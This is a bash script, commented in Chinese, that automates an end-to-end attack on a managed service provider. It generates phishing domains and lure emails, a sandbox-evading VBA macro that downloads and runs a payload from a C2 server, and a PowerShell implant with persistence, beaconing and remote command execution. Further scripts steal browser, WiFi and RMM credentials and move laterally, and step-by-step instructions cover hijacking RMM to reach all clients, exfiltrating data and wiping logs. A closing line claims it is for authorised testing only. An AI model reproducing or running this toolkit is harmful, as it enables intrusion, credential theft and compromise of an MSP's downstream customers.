#!/bin/bash
# MSP/服务器商完整攻击自动化脚本
# 从侦察到权限获取

TARGET_MSP="$1"  # 目标 MSP 公司名称

if [ -z "$TARGET_MSP" ]; then
    echo "Usage: $0 <target_msp_company>"
    exit 1
fi

WORK_DIR="/tmp/msp_attack_$(date +%s)"
mkdir -p $WORK_DIR/{recon,phishing,payloads,loot}
cd $WORK_DIR

echo "[*] 目标: $TARGET_MSP"
echo "[*] 工作目录: $WORK_DIR"
echo ""

# =============================================================================
# [阶段 1] 侦察自动化
# =============================================================================

echo "═══════════════════════════════════════"
echo "[阶段 1] 自动侦察"
echo "═══════════════════════════════════════"

# 1.1 域名识别
echo "[*] 识别域名..."
TARGET_DOMAIN=$(echo "$TARGET_MSP" | tr ' ' '-' | tr '[:upper:]' '[:lower:]').com

# 尝试多个域名变体
for tld in com net io cloud tech services; do
    domain=$(echo "$TARGET_MSP" | tr ' ' '' | tr '[:upper:]' '[:lower:]').$tld
    if host $domain >/dev/null 2>&1; then
        TARGET_DOMAIN=$domain
        echo "[+] 找到域名: $TARGET_DOMAIN"
        break
    fi
done

# 1.2 子域名枚举
echo "[*] 枚举子域名..."
subfinder -d $TARGET_DOMAIN -silent > recon/subdomains.txt 2>/dev/null || \
    echo "portal\nmail\nvpn\nremote\nrmm\nsupport\nadmin" | sed "s/$/.${TARGET_DOMAIN}/" > recon/subdomains.txt

cat recon/subdomains.txt

# 1.3 员工邮箱推测
echo "[*] 推测员工邮箱格式..."
cat > recon/email_patterns.txt << EOF
admin@${TARGET_DOMAIN}
support@${TARGET_DOMAIN}
it@${TARGET_DOMAIN}
helpdesk@${TARGET_DOMAIN}
technical@${TARGET_DOMAIN}
operations@${TARGET_DOMAIN}
security@${TARGET_DOMAIN}
EOF

# 1.4 LinkedIn 员工枚举（手动步骤提示）
echo "[*] LinkedIn 员工搜索命令:"
echo "    site:linkedin.com \"$TARGET_MSP\" \"System Administrator\""
echo "    site:linkedin.com \"$TARGET_MSP\" \"IT Manager\""
echo "    site:linkedin.com \"$TARGET_MSP\" \"DevOps\""
echo "    site:linkedin.com \"$TARGET_MSP\" \"Technical Support\""

# 1.5 Shodan 搜索暴露的服务
echo "[*] 搜索暴露的服务..."
cat > recon/shodan_commands.txt << EOF
shodan search "org:\"${TARGET_MSP}\" port:443"
shodan search "ssl.cert.subject.cn:\"${TARGET_DOMAIN}\""
shodan search "hostname:${TARGET_DOMAIN} port:3389,5900,8080"
EOF

echo "[+] Shodan 命令已保存到: recon/shodan_commands.txt"

# 1.6 GitHub 泄露搜索
echo "[*] 搜索 GitHub 泄露..."
cat > recon/github_dorks.txt << EOF
org:${TARGET_MSP} password
org:${TARGET_MSP} api_key
org:${TARGET_MSP} secret
"${TARGET_DOMAIN}" password
"${TARGET_DOMAIN}" api_key
"@${TARGET_DOMAIN}" filename:.env
EOF

# =============================================================================
# [阶段 2] 钓鱼准备
# =============================================================================

echo ""
echo "═══════════════════════════════════════"
echo "[阶段 2] 钓鱼基础设施"
echo "═══════════════════════════════════════"

# 2.1 生成钓鱼域名
echo "[*] 生成钓鱼域名建议..."
cat > phishing/domains.txt << EOF
${TARGET_DOMAIN//./-}.com
${TARGET_DOMAIN//./}.net
$(echo $TARGET_DOMAIN | sed 's/o/0/g')
$(echo $TARGET_DOMAIN | sed 's/i/l/g')
support-${TARGET_DOMAIN}
portal-${TARGET_DOMAIN}
secure-${TARGET_DOMAIN}
EOF

echo "[+] 钓鱼域名建议:"
cat phishing/domains.txt

# 2.2 生成钓鱼邮件模板
cat > phishing/email_urgent_support.html << 'TEMPLATE'
Subject: URGENT: Critical Server Failure - All Services Down!

<html>
<body style="font-family: Arial, sans-serif;">
<div style="background: #dc3545; color: white; padding: 10px;">
⚠️ CRITICAL ALERT - IMMEDIATE ATTENTION REQUIRED
</div>

<p>Dear Technical Support Team,</p>

<p><strong style="color: red;">URGENT:</strong> Our production server has been completely offline for the past 3 hours.</p>

<p><strong>Impact:</strong></p>
<ul>
<li>All customer-facing services are down</li>
<li>E-commerce platform offline</li>
<li>Estimated revenue loss: $15,000/hour</li>
<li>CEO demanding immediate resolution</li>
</ul>

<p><strong>Error Details:</strong><br>
Server: PROD-WEB-01<br>
Account ID: MSP-{RANDOM}<br>
Last Error: Critical system failure (logs attached)</p>

<p><strong>Attached:</strong> server_error_logs.zip</p>

<p style="color: red;">⏰ Please respond within 30 minutes - this is affecting our entire business!</p>

<p>Contact: +1-555-{RANDOM}<br>
Client: {COMPANY_NAME}</p>

</body>
</html>
TEMPLATE

cat > phishing/email_invoice.html << 'TEMPLATE'
Subject: Invoice #{INVOICE} Overdue - Account Suspension Notice

<html>
<body style="font-family: Arial, sans-serif;">

<p>Dear Billing Department,</p>

<p>Our records show that Invoice #{INVOICE} for ${AMOUNT} is now 45 days overdue.</p>

<p><strong>Invoice Details:</strong></p>
<ul>
<li>Invoice Number: #{INVOICE}</li>
<li>Amount: ${AMOUNT}</li>
<li>Due Date: {DATE}</li>
<li>Service Period: {PERIOD}</li>
</ul>

<p><strong style="color: orange;">⚠️ Action Required:</strong></p>
<p>Please review the attached invoice and remit payment within 48 hours to avoid service interruption.</p>

<p><strong>Attached:</strong> Invoice_{INVOICE}.docx</p>

<p>If payment has been sent, please disregard this notice and reply with payment confirmation.</p>

<p>Thank you,<br>
Accounts Receivable<br>
{COMPANY_NAME}<br>
Phone: +1-555-{RANDOM}</p>

</body>
</html>
TEMPLATE

cat > phishing/email_security_audit.html << 'TEMPLATE'
Subject: Annual Security Compliance Review - Action Required

<html>
<body style="font-family: Arial, sans-serif;">

<p>Dear Security Team,</p>

<p>As part of our annual vendor risk assessment, we require all IT service providers to complete a mandatory security review.</p>

<p><strong>Required by:</strong> {DEADLINE}</p>

<p><strong>Documents Needed:</strong></p>
<ol>
<li>SOC 2 Type II Report</li>
<li>Penetration Test Results (within 12 months)</li>
<li>Vulnerability Scan Reports (within 90 days)</li>
<li>Security Questionnaire (attached - enable macros)</li>
</ol>

<p><strong>Attached:</strong> Security_Assessment_2024.xlsx</p>

<p><strong>Portal Access:</strong><br>
URL: https://vendor-portal.{CUSTOMER_DOMAIN}/upload<br>
Username: {EMAIL}<br>
Temp Password: Vendor2024!</p>

<p style="color: red;">⚠️ Failure to complete by deadline may result in contract review or suspension.</p>

<p>Regards,<br>
Vendor Risk Management<br>
{CUSTOMER_NAME}<br>
compliance@{CUSTOMER_DOMAIN}</p>

</body>
</html>
TEMPLATE

echo "[+] 钓鱼模板已生成: phishing/email_*.html"

# 2.3 生成恶意 Office 文档
cat > payloads/generate_malicious_doc.py << 'PAYLOAD'
#!/usr/bin/env python3
"""
生成恶意 Office 文档（带宏）
"""
import sys

def generate_vba_macro(c2_url, output_file):
    """生成 VBA 宏代码"""
    
    vba_code = f'''
Sub AutoOpen()
    On Error Resume Next
    ExecutePayload
End Sub

Sub Document_Open()
    On Error Resume Next
    ExecutePayload
End Sub

Private Sub ExecutePayload()
    ' 反沙箱检查
    If Not IsRealEnvironment() Then Exit Sub
    
    ' 下载并执行 payload
    Dim cmd As String
    cmd = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command " & _
          Chr(34) & "$wc=New-Object Net.WebClient;" & _
          "$wc.DownloadFile('{c2_url}/stage1.exe','$env:TEMP\\\\svchost.exe');" & _
          "Start-Process $env:TEMP\\\\svchost.exe -WindowStyle Hidden" & Chr(34)
    
    Shell cmd, vbHide
    
    ' 显示假错误
    MsgBox "This document is corrupted. Please contact the sender.", vbCritical, "Error"
    Application.Quit
End Sub

Private Function IsRealEnvironment() As Boolean
    IsRealEnvironment = False
    
    ' 检查屏幕分辨率
    If Application.Width < 800 Then Exit Function
    
    ' 检查最近文件
    If Application.RecentFiles.Count < 2 Then Exit Function
    
    ' 检查计算机名
    Dim pc As String
    pc = LCase(Environ("COMPUTERNAME"))
    If InStr(pc, "sandbox") > 0 Then Exit Function
    If InStr(pc, "malware") > 0 Then Exit Function
    If InStr(pc, "virus") > 0 Then Exit Function
    
    IsRealEnvironment = True
End Function
'''
    
    print(f"[+] VBA 宏代码:")
    print(vba_code)
    print(f"\n[*] 将此代码插入 Word/Excel 文档的 VBA 编辑器")
    print(f"[*] 工具: Alt+F11 -> 插入 -> 模块 -> 粘贴代码")
    
    with open(output_file, 'w') as f:
        f.write(vba_code)
    
    print(f"\n[+] 宏代码已保存: {output_file}")

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <c2_url>")
        sys.exit(1)
    
    c2_url = sys.argv[1]
    generate_vba_macro(c2_url, 'macro.vba')
PAYLOAD

chmod +x payloads/generate_malicious_doc.py

# 2.4 生成 PowerShell payload
cat > payloads/stage1.ps1 << 'STAGE1'
# Stage 1 Payload - 初始访问

# 反沙箱
$screens = [System.Windows.Forms.Screen]::AllScreens
if ($screens.Count -lt 1 -or $screens[0].Bounds.Width -lt 800) { exit }

# 持久化
$payload = $MyInvocation.MyCommand.Path
$dest = "$env:APPDATA\Microsoft\Windows\svchost.exe"
Copy-Item $payload $dest -Force

# 注册表
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Host Service" /d "$dest" /f

# 计划任务
$action = New-ScheduledTaskAction -Execute $dest
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -TaskName "Windows Update Service" -Action $action -Trigger $trigger -RunLevel Highest -Force -ErrorAction SilentlyContinue

# 初始侦察
$recon = @{
    hostname = $env:COMPUTERNAME
    username = $env:USERNAME
    domain = $env:USERDNSDOMAIN
    os = (Get-WmiObject Win32_OperatingSystem).Caption
    ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike "127.*"})[0].IPAddress
    av = (Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct -ErrorAction SilentlyContinue).displayName
    rmm = Get-Process | Where-Object {$_.ProcessName -match "connectwise|kaseya|screenconnect|teamviewer"} | Select-Object ProcessName
}

# Beacon
$c2 = "http://YOUR_C2_SERVER/api/checkin"
$data = $recon | ConvertTo-Json -Compress | ForEach-Object { [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($_)) }
try { Invoke-RestMethod -Uri $c2 -Method POST -Body $data -UseBasicParsing } catch {}

# 命令循环
while ($true) {
    Start-Sleep 300
    try {
        $cmd = Invoke-RestMethod -Uri "$c2/cmd?id=$env:COMPUTERNAME" -UseBasicParsing
        if ($cmd) {
            $out = Invoke-Expression $cmd 2>&1 | Out-String
            $out64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($out))
            Invoke-RestMethod -Uri "$c2/result" -Method POST -Body "output=$out64" -UseBasicParsing
        }
    } catch {}
}
STAGE1

# =============================================================================
# [阶段 3] 生成自动化攻击脚本
# =============================================================================

echo ""
echo "═══════════════════════════════════════"
echo "[阶段 3] 后渗透自动化"
echo "═══════════════════════════════════════"

# 3.1 凭证窃取
cat > payloads/steal_credentials.ps1 << 'CREDS'
# 自动化凭证窃取

$output = @()

# 1. 浏览器密码
$chrome = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
if (Test-Path $chrome) {
    Copy-Item $chrome "$env:TEMP\chrome.db" -Force
    $output += "[+] Chrome 密码数据库: $env:TEMP\chrome.db"
}

# 2. Saved RDP
$rdp = cmdkey /list | Select-String "Target:"
$output += "[+] RDP 凭证:`n$rdp"

# 3. WiFi 密码
$wifi = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object {
    $profile = $_ -replace ".*: ", ""
    $pass = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content"
    "$profile : $pass"
}
$output += "[+] WiFi 密码:`n$($wifi -join "`n")"

# 4. 文件系统搜索
$patterns = @("*password*", "*credential*", "*secret*", "*config*")
$locations = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents")

foreach ($loc in $locations) {
    foreach ($pat in $patterns) {
        $files = Get-ChildItem -Path $loc -Filter $pat -Recurse -ErrorAction SilentlyContinue | Select-Object FullName
        if ($files) {
            $output += "[+] 找到敏感文件: $($files.FullName -join ', ')"
        }
    }
}

# 5. PowerShell 历史
$history = Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
if ($history) {
    $sensitive = $history | Select-String -Pattern "password|credential|key|secret"
    if ($sensitive) {
        $output += "[+] PowerShell 历史中的敏感命令:`n$sensitive"
    }
}

# 输出
$output -join "`n`n" | Out-File "$env:TEMP\credentials.txt"
Write-Host "[+] 凭证已保存: $env:TEMP\credentials.txt"
CREDS

# 3.2 RMM 识别和利用
cat > payloads/target_rmm.ps1 << 'RMM'
# RMM 工具识别和数据提取

# 检测 RMM 进程
$rmm_processes = @(
    "ScreenConnect.ClientService",
    "ScreenConnect.WindowsClient",
    "ConnectWiseControl",
    "KaseyaAgentEndpoint", 
    "N-central",
    "TeamViewer",
    "AnyDesk"
)

$found = Get-Process | Where-Object {
    $proc = $_.ProcessName
    $rmm_processes | Where-Object { $proc -like "*$_*" }
}

if ($found) {
    Write-Host "[+] 检测到 RMM: $($found.ProcessName -join ', ')"
    
    # ConnectWise 配置
    $cw_config = "C:\Program Files (x86)\ScreenConnect Client*\user.config"
    if (Test-Path $cw_config) {
        $config = Get-Content $cw_config -Raw
        Write-Host "[+] ConnectWise 配置:"
        Write-Host $config
        
        # 提取服务器地址
        if ($config -match 'Host>(.*?)<') {
            $server = $Matches[1]
            Write-Host "[!] RMM 服务器: $server"
        }
    }
    
    # Kaseya 配置  
    $kaseya_config = "C:\Kaseya\*.ini"
    if (Test-Path $kaseya_config) {
        $config = Get-Content $kaseya_config -Raw
        Write-Host "[+] Kaseya 配置:"
        Write-Host $config
    }
    
    # 尝试访问 RMM 管理端
    Write-Host "[*] 尝试访问 RMM 管理控制台..."
    Write-Host "[*] 查找保存的浏览器会话..."
    
} else {
    Write-Host "[-] 未检测到 RMM 工具"
}
RMM

# 3.3 横向移动
cat > payloads/lateral_movement.ps1 << 'LATERAL'
# 自动化横向移动

param(
    [string]$Username,
    [string]$Password
)

# 1. 网络扫描
Write-Host "[*] 扫描内网..."
$network = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -notlike "127.*"})[0].IPAddress
$subnet = $network -replace '\.\d+$', ''

$live_hosts = @()
1..254 | ForEach-Object -Parallel {
    $ip = "$using:subnet.$_"
    if (Test-Connection -ComputerName $ip -Count 1 -Quiet) {
        $live_hosts += $ip
    }
} -ThrottleLimit 50

Write-Host "[+] 发现主机: $($live_hosts.Count)"
$live_hosts | Out-File "$env:TEMP\live_hosts.txt"

# 2. SMB 扫描
Write-Host "[*] 扫描 SMB 共享..."
foreach ($ip in $live_hosts) {
    try {
        $shares = net view \\$ip 2>$null
        if ($shares) {
            Write-Host "[+] $ip - 共享: $shares"
        }
    } catch {}
}

# 3. RDP 尝试
if ($Username -and $Password) {
    Write-Host "[*] 尝试 RDP 连接..."
    foreach ($ip in $live_hosts) {
        $secpwd = ConvertTo-SecureString $Password -AsPlainText -Force
        $cred = New-Object System.Management.Automation.PSCredential($Username, $secpwd)
        
        try {
            $test = Test-WSMan -ComputerName $ip -Credential $cred -ErrorAction Stop
            Write-Host "[+] $ip - RDP 可访问!"
        } catch {}
    }
}

# 4. 查找域控
try {
    $dc = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers
    Write-Host "[+] 域控制器: $($dc.Name)"
} catch {
    Write-Host "[-] 非域环境"
}
LATERAL

echo "[+] Payload 已生成:"
ls -lh payloads/

# =============================================================================
# [阶段 4] 使用说明
# =============================================================================

echo ""
echo "═══════════════════════════════════════"
echo "[使用说明]"
echo "═══════════════════════════════════════"

cat > INSTRUCTIONS.txt << INSTRUCTIONS

## 完整攻击流程

### [步骤 1] 侦察（已自动化）
✓ 域名识别
✓ 子域名枚举  
✓ 员工邮箱推测
✓ 服务暴露扫描

结果保存在: recon/

### [步骤 2] 钓鱼准备

1. 注册钓鱼域名（从 phishing/domains.txt 选择）
   推荐工具: Namecheap, Cloudflare

2. 获取 SSL 证书
   certbot certonly --standalone -d your-phishing-domain.com

3. 设置邮件服务器或使用合法邮件服务
   - Gmail（新账户）
   - ProtonMail
   - Tutanota

### [步骤 3] 生成恶意文档

python3 payloads/generate_malicious_doc.py http://YOUR_C2_SERVER

然后：
1. 打开 Microsoft Word
2. 按 Alt+F11 打开 VBA 编辑器
3. 插入 -> 模块
4. 粘贴生成的宏代码
5. 保存为 .docm 或 .xlsm

### [步骤 4] 发送钓鱼邮件

选择模板: phishing/email_*.html
自定义:
- {INVOICE} = 随机发票号
- {AMOUNT} = 金额
- {DATE} = 日期
- {COMPANY_NAME} = 伪装公司名

发送给: recon/email_patterns.txt 中的地址

### [步骤 5] 设置 C2 服务器

简单 HTTP C2:
python3 -m http.server 8080

或使用专业工具:
- Metasploit
- Cobalt Strike  
- Sliver
- Mythic

修改 payloads/stage1.ps1 中的 C2 地址

### [步骤 6] 等待受害者

当受害者打开恶意文档并启用宏：
1. Payload 自动下载并执行
2. 建立持久化
3. Beacon 回连到 C2
4. 收到初始侦察数据

### [步骤 7] 后渗透

在受害者机器上执行:

# 窃取凭证
IEX(Get-Content payloads/steal_credentials.ps1)

# 识别 RMM
IEX(Get-Content payloads/target_rmm.ps1)

# 横向移动
.\payloads\lateral_movement.ps1 -Username "admin" -Password "stolen_password"

### [步骤 8] 目标: RMM 访问

如果是 MSP 员工机器:
1. 监控 RMM 工具启动
2. 窃取浏览器 session cookies
3. 劫持 RMM 管理员会话
4. 访问所有客户

如果获得 RMM 服务器访问:
1. 访问数据库
2. 提取所有客户凭证
3. 批量部署后门到客户环境

### [步骤 9] 数据外泄

收集敏感数据后:
1. 压缩: Compress-Archive -Path C:\loot\* -Dest C:\data.zip
2. 外泄: 
   - HTTPS 上传
   - DNS 隧道
   - 云存储（使用窃取的凭证）

### [步骤 10] 清理痕迹

- 删除 payload 文件
- 清空日志
- 删除计划任务/注册表项（如果需要）

INSTRUCTIONS

cat INSTRUCTIONS.txt

echo ""
echo "═══════════════════════════════════════"
echo "[完成]"
echo "═══════════════════════════════════════"
echo ""
echo "工作目录: $WORK_DIR"
echo ""
echo "下一步:"
echo "1. 查看侦察结果: cd recon/ && ls"
echo "2. 选择钓鱼模板: cat phishing/email_*.html"
echo "3. 生成恶意文档: python3 payloads/generate_malicious_doc.py"
echo "4. 阅读完整说明: cat INSTRUCTIONS.txt"
echo ""
echo "⚠️  仅用于授权测试"
